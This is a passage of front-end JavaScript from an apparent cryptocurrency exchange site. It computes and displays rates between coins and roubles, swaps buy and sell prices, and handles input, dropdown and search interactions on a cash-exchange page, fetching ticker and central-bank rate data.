                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_DASH) ) } DASH = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${ addedSpacesInNumbers( (Number(PRICE_DASH) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${addedSpacesInNumbers((Number(PRICE_DASH) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${addedSpacesInNumbers((Number(PRICE_DASH) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${addedSpacesInNumbers((Number(PRICE_DASH) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 DASH = ${addedSpacesInNumbers((Number(PRICE_DASH) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    }

                } else if ( valuteFirstName == 'Zcash (ZEC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers((PRICE_ZEC * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_ZEC) ) } ZEC = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( Number(PRICE_ZEC) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( Number(PRICE_ZEC) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( Number(PRICE_ZEC) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_ZEC) ) } ZEC = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_ZEC) ) } ZEC = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( Number(PRICE_ZEC) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_ZEC) ) } ZEC = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_ZEC) ) } ZEC = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_ZEC) ) } ZEC = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_ZEC) ) } ZEC = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${ addedSpacesInNumbers( (Number(PRICE_ZEC) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${addedSpacesInNumbers((Number(PRICE_ZEC) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${addedSpacesInNumbers((Number(PRICE_ZEC) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${addedSpacesInNumbers((Number(PRICE_ZEC) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 ZEC = ${addedSpacesInNumbers((Number(PRICE_ZEC) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    } 
                } else if ( valuteFirstName == 'Binance Coin (BNB BEP20)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers((PRICE_BNB * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_BNB) ) } BNB = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( Number(PRICE_BNB) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( Number(PRICE_BNB) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( Number(PRICE_BNB) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_BNB) ) } BNB = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_BNB) ) } BNB = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( Number(PRICE_BNB) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_BNB) ) } BNB = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_BNB) ) } BNB = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_BNB) ) } BNB = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_BNB) ) } BNB = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${ addedSpacesInNumbers( (Number(PRICE_BNB) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${addedSpacesInNumbers((Number(PRICE_BNB) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${addedSpacesInNumbers((Number(PRICE_BNB) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${addedSpacesInNumbers((Number(PRICE_BNB) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 BNB = ${addedSpacesInNumbers((Number(PRICE_BNB) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    } 
                } else if ( valuteFirstName == 'Monero (XMR)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers((PRICE_XMR * data.Valute.USD.Value).toFixed(2)) } RUB`;
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BTC) / Number(PRICE_XMR) ) } XMR = 1 BTC`;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( Number(PRICE_XMR) / Number(PRICE_USDT) ) } USDT`;
                    } else if ( valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( Number(PRICE_XMR) / Number(PRICE_USDC) ) } USDC`;
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( Number(PRICE_XMR) / Number(PRICE_DAI) ) } DAI`;
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_DOT) / Number(PRICE_XMR) ) } XMR = 1 DOT`;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_SOL) / Number(PRICE_XMR) ) } XMR = 1 SOL`;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( Number(PRICE_XMR) / Number(PRICE_POL) ) } POL`;
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETH) / Number(PRICE_XMR) ) } XMR = 1 ETH`;
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_ARB)).toFixed(5) ) } ARB`;
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_LTC) / Number(PRICE_XMR) ) } XMR = 1 LTC`;
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_BCH) / Number(PRICE_XMR) ) } XMR = 1 BCH`;
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_XRP)).toFixed(5) ) } XRP`;
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_DOGE)).toFixed(5) ) } DOGE`;
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__p2p').textContent = `${ addedSpacesInNumbers( Number(PRICE_ETC) / Number(PRICE_XMR) ) } XMR = 1 ETC`;
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_XLM)).toFixed(5) ) } XLM`;
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_TRX)).toFixed(5) ) } TRX`;
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${ addedSpacesInNumbers( (Number(PRICE_XMR) / Number(PRICE_TON)).toFixed(5) ) } TON`;
                    } else if (valuteSecondName == 'Dash (DASH)') {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${addedSpacesInNumbers((Number(PRICE_XMR) / Number(PRICE_DASH)).toFixed(5))} DASH`;
                    } else if (valuteSecondName == 'Zcash (ZEC)') {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${addedSpacesInNumbers((Number(PRICE_XMR) / Number(PRICE_ZEC)).toFixed(5))} ZEC`;
                    } else if (valuteSecondName == 'Binance Coin (BNB BEP20)') {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${addedSpacesInNumbers((Number(PRICE_XMR) / Number(PRICE_BNB)).toFixed(5))} BNB`;
                    } else if (valuteSecondName == 'Monero (XMR)') {
                        document.querySelector('.first__p2p').textContent = `1 XMR = ${addedSpacesInNumbers((Number(PRICE_XMR) / Number(PRICE_XMR)).toFixed(5))} XMR`;
                    } 
                }

            }
        
        }

        if ( valuteCategoryFirst == "CRYPTO" && valuteCategorySecond == "CRYPTO" ) {

        } else if ( valuteCategoryFirst == "CRYPTO" && valuteCategorySecond != "CRYPTO" ) {
            PRICE_BTC = PRICE_BTC_BUY;
            PRICE_TON = PRICE_TON_BUY;
            PRICE_USDT = PRICE_USDT_BUY;
            PRICE_DAI = PRICE_DAI_BUY;
            PRICE_DOT = PRICE_DOT_BUY;
            PRICE_USDC = PRICE_USDC_BUY;
            PRICE_SOL = PRICE_SOL_BUY;
            PRICE_POL = PRICE_POL_BUY;
            PRICE_ETH = PRICE_ETH_BUY;
            PRICE_ARB = PRICE_ARB_BUY;
            PRICE_LTC = PRICE_LTC_BUY;
            PRICE_BCH = PRICE_BCH_BUY;
            PRICE_DASH = PRICE_DASH_BUY;
            PRICE_ZEC = PRICE_ZEC_BUY;
            PRICE_BNB = PRICE_BNB_BUY;
            PRICE_XRP = PRICE_XRP_BUY;
            PRICE_DOGE = PRICE_DOGE_BUY;
            PRICE_ETC = PRICE_ETC_BUY;
            PRICE_XMR = PRICE_XMR_BUY;
            PRICE_XLM = PRICE_XLM_BUY;
            PRICE_TRX = PRICE_TRX_BUY;
        } else if ( valuteCategoryFirst != "CRYPTO" && valuteCategorySecond == "CRYPTO" ) {
            PRICE_BTC = PRICE_BTC_SELL;
            PRICE_TON = PRICE_TON_SELL;
            PRICE_USDT = PRICE_USDT_SELL;
            PRICE_DAI = PRICE_DAI_SELL;
            PRICE_DOT = PRICE_DOT_SELL;
            PRICE_USDC = PRICE_USDC_SELL;
            PRICE_SOL = PRICE_SOL_SELL;
            PRICE_POL = PRICE_POL_SELL;
            PRICE_ETH = PRICE_ETH_SELL;
            PRICE_ARB = PRICE_ARB_SELL;
            PRICE_LTC = PRICE_LTC_SELL;
            PRICE_BCH = PRICE_BCH_SELL;
            PRICE_DASH = PRICE_DASH_SELL;
            PRICE_ZEC = PRICE_ZEC_SELL;
            PRICE_BNB = PRICE_BNB_SELL;
            PRICE_XRP = PRICE_XRP_SELL;
            PRICE_DOGE = PRICE_DOGE_SELL;
            PRICE_ETC = PRICE_ETC_SELL;
            PRICE_XMR = PRICE_XMR_SELL;
            PRICE_XLM = PRICE_XLM_SELL;
            PRICE_TRX = PRICE_TRX_SELL;
        }
        
        getCurrencies();

    }).catch((error) => {
        console.error('Ошибка получения списка: ', error);
    })

}
timerReloadActual();


// СТРАНИЦА ОБМЕНА ЗА НАЛИЧНЫЕ

document.querySelectorAll('.cash__val')[0].addEventListener('click', event => {
    location.href = location.origin;
})

document.querySelector('.cash__inst').addEventListener('click', event => {
    document.querySelector(".manual").scrollIntoView({ block: "start", behavior: "smooth" });
})

document.querySelectorAll('.cash__area').forEach( item => {
    item.addEventListener('click', event => {
        document.querySelector('.cash__hide').style.display = 'block';
        document.querySelector('.cash__bottom').classList.add('cash__bottom-active');
    })
} )

// Убираем сообщения и смена цвета бордеров

document.querySelector('.cash__first-input').addEventListener('focus', event => {
    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #000';
})

document.querySelector('.cash__first-input').addEventListener('blur', event => {
    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #cfcfcf';
})

document.querySelector('.cash__first-input').addEventListener('click', event => {
    document.querySelectorAll('.cash__area')[0].style.border = '2px solid #000';
    document.querySelectorAll('.cash__message')[0].style.display = 'none';
    document.querySelector('.cash__get').style.marginBottom = '20px';
    document.querySelector('.cash__window').style.display = 'none';
})



document.querySelector('.cash__second-input').addEventListener('focus', event => {
    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #000';
})

document.querySelector('.cash__second-input').addEventListener('blur', event => {
    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #cfcfcf';
})

document.querySelector('.cash__second-input').addEventListener('click', event => {
    document.querySelectorAll('.cash__area')[1].style.border = '2px solid #000';
    document.querySelectorAll('.cash__message')[1].style.display = 'none';
    document.querySelector('.cash__take').style.marginBottom = '20px';
    document.querySelector('.cash__window').style.display = 'none';
})



document.querySelector('.cash__user-input').addEventListener('focus', event => {
    document.querySelector('.cash__user-input').style.border = '2px solid #000';
})

document.querySelector('.cash__user-input').addEventListener('blur', event => {
    document.querySelector('.cash__user-input').style.border = '2px solid #cfcfcf';
})

document.querySelector('.cash__user-input').addEventListener('click', event => {
    document.querySelector('.cash__user-input').style.border = '2px solid #000';
    document.querySelectorAll('.cash__message')[2].style.display = 'none';
    document.querySelector('.cash__user').style.marginBottom = '20px';
    document.querySelector('.cash__window').style.display = 'none';
})



document.querySelector('.cash__email-input').addEventListener('focus', event => {
    document.querySelector('.cash__email-input').style.border = '2px solid #000';
})

document.querySelector('.cash__email-input').addEventListener('blur', event => {
    document.querySelector('.cash__email-input').style.border = '2px solid #cfcfcf';
})

document.querySelector('.cash__email-input').addEventListener('click', event => {
    document.querySelector('.cash__email-input').style.border = '2px solid #000';
    document.querySelectorAll('.cash__message')[3].style.display = 'none';
    document.querySelector('.cash__email').style.marginBottom = '20px';
    document.querySelector('.cash__window').style.display = 'none';
})



document.querySelector('.cash__contact-input').addEventListener('focus', event => {
    document.querySelector('.cash__contact-input').style.border = '2px solid #000';
})

document.querySelector('.cash__contact-input').addEventListener('blur', event => {
    document.querySelector('.cash__contact-input').style.border = '2px solid #cfcfcf';
})

document.querySelector('.cash__contact-input').addEventListener('click', event => {
    document.querySelector('.cash__contact-input').style.border = '2px solid #000';
    document.querySelectorAll('.cash__message')[4].style.display = 'none';
    document.querySelector('.cash__contact').style.marginBottom = '20px';
    document.querySelector('.cash__window').style.display = 'none';
})

let activeCashFirstBtn = false;
document.querySelectorAll('.cash__btn')[0].addEventListener('click', event => {
    if ( activeCashFirstBtn == false ) {
        document.querySelector('.table-four').style.display = 'block';
        document.querySelector('.cash__first-input').style.background = '#f2f4f5';
        activeCashFirstBtn = true;

        document.querySelector('.table-five').style.display = 'none';
        document.querySelector('.cash__second-input').style.background = 'none';
        activeCashSecondBtn = false;
    } else {
        document.querySelector('.table-four').style.display = 'none';
        document.querySelector('.cash__first-input').style.background = 'none';
        activeCashFirstBtn = false;
    }
    document.querySelector('.cash__window').style.display = 'none';
})

document.querySelector('.table-four__mobile svg').addEventListener('click', event => {
    document.querySelector('.table-four').style.display = 'none';
    document.querySelector('.cash__first-input').style.background = 'none';
    activeCashFirstBtn = false;
})

let activeCashSecondBtn = false;
document.querySelectorAll('.cash__btn')[1].addEventListener('click', event => {
    if ( activeCashSecondBtn == false ) {
        document.querySelector('.table-five').style.display = 'block';
        document.querySelector('.cash__second-input').style.background = '#f2f4f5';
        activeCashSecondBtn = true;
    } else {
        document.querySelector('.table-five').style.display = 'none';
        document.querySelector('.cash__second-input').style.background = 'none';
        activeCashSecondBtn = false;
    }
    document.querySelector('.cash__window').style.display = 'none';
})

document.querySelector('.table-five__mobile svg').addEventListener('click', event => {
    document.querySelector('.table-five').style.display = 'none';
    document.querySelector('.cash__second-input').style.background = 'none';
    activeCashSecondBtn = false;
})

document.querySelectorAll('.table-four__button').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelectorAll('.table-four__button').forEach( item => {
            item.classList.remove('table-four__button-active');
        })

        document.querySelectorAll('.table-four__valute').forEach( item => {
            item.style.display = 'none';
        } )

        item.classList.add('table-four__button-active');

        if ( i == 0 ) {
            document.querySelectorAll('.table-four__valute').forEach( item => {
                item.style.display = 'flex';
            } )
        } else if ( i == 1 ) {
            document.querySelectorAll('.table-four__valute-crypto').forEach( item => {
                item.style.display = 'flex';
            } )
        } else if ( i == 2 ) {
            document.querySelectorAll('.table-four__valute-cash').forEach( item => {
                item.style.display = 'flex';
            } )
        }

    })
})

document.querySelector('.table-four__search input').addEventListener('input', event => {
    document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })

    document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table-four__valute p')[i].textContent.toLowerCase().includes(document.querySelector('.table-four__search input').value.toLowerCase()) ) {
            item.style.display = 'flex';
            document.querySelector('.table-four__buttons').style.display = 'none';
        }
    })


    if ( document.querySelector('.table-four__search input').value == '' ) {

        document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
            item.style.display = 'flex';
        })
        
        document.querySelector('.table-four__buttons').style.display = 'flex';
        document.querySelector('.table-four__search svg').style.display = 'none';
    } else if ( document.querySelector('.table-four__search input').value != '' ) {
        document.querySelector('.table-four__search svg').style.display = 'block';
    }
})

document.querySelector('.table-four__search svg').addEventListener('click', event => {
    document.querySelector('.table-four__search svg').style.display = 'none';
    document.querySelector('.table-four__buttons').style.display = 'flex';
    document.querySelectorAll('.table-four__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })
    document.querySelector('.table-four__search input').value = '';
})

document.querySelectorAll('.table-five__button')[1].style.display = 'none';
document.querySelectorAll('.table-five__valute')[0].style.display = 'none';

let cashFirstValute = 'Tether TRC20 (USDT)';
let cashSecondValute = 'Наличные RUB';

document.querySelectorAll('.table-five__button').forEach( (item, i) => {
    item.addEventListener('click', event => {

        document.querySelectorAll('.table-five__button').forEach( item => {
            item.classList.remove('table-five__button-active');
        })

        document.querySelectorAll('.table-five__valute').forEach( item => {
            item.style.display = 'none';
        } )

        item.classList.add('table-five__button-active');

        if ( i == 0 ) {
            if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
                document.querySelectorAll('.table-five__valute-cash').forEach( item => {
                    item.style.display = 'flex';
                } )
            } else {
                document.querySelectorAll('.table-five__valute-crypto').forEach( item => {
                    item.style.display = 'flex';
                } )
            }
        } else if ( i == 1 ) {
            document.querySelectorAll('.table-five__valute-crypto').forEach( item => {
                item.style.display = 'flex';
            } )
        } else if ( i == 2 ) {
            document.querySelectorAll('.table-five__valute-cash').forEach( item => {
                item.style.display = 'flex';
            } )
        }

    })
})

document.querySelector('.table-five__search input').addEventListener('input', event => {
    document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
        item.style.display = 'none';
    })

    document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
        if ( document.querySelectorAll('.table-five__valute p')[i].textContent.toLowerCase().includes(document.querySelector('.table-five__search input').value.toLowerCase()) ) {
            item.style.display = 'flex';
            document.querySelector('.table-five__buttons').style.display = 'none';

            if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
                document.querySelector('.table-five__valute-crypto').style.display = 'none';
            } else {
                document.querySelectorAll('.table-five__valute-cash').forEach( item => {
                    item.style.display = 'none';
                })
            }

        }
    })


    if ( document.querySelector('.table-five__search input').value == '' ) {

        document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
            item.style.display = 'flex';
        })

        if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
            document.querySelector('.table-five__valute-crypto').style.display = 'none';
        } else {
            document.querySelectorAll('.table-five__valute-cash').forEach( item => {
                item.style.display = 'none';
            })
        }
        
        document.querySelector('.table-five__buttons').style.display = 'flex';
        document.querySelector('.table-five__search svg').style.display = 'none';
    } else if ( document.querySelector('.table-five__search input').value != '' ) {
        document.querySelector('.table-five__search svg').style.display = 'block';
    }
})

document.querySelector('.table-five__search svg').addEventListener('click', event => {
    document.querySelector('.table-five__search svg').style.display = 'none';
    document.querySelector('.table-five__buttons').style.display = 'flex';
    document.querySelectorAll('.table-five__valute').forEach( (item, i) => {
        item.style.display = 'flex';
    })

    if ( cashFirstValute == 'Tether TRC20 (USDT)' ) {
        document.querySelector('.table-five__valute-crypto').style.display = 'none';
    } else {
        document.querySelectorAll('.table-five__valute-cash').forEach( item => {
            item.style.display = 'none';
        })
    }

    document.querySelector('.table-five__search input').value = '';
})

let minUSD = 700;
let maxUSD = 100000;
let minUSDT = 0;
let maxUSDT = 0;
let minEUR = 0;
let maxEUR = 0;
let minRUB = 0;
let maxRUB = 0;

fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
    if (result.status === 200 && result.ok) {
        return result.json()
    }
}).then((JSON_DATA) => {

    async function getCurrencies(){  
        const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
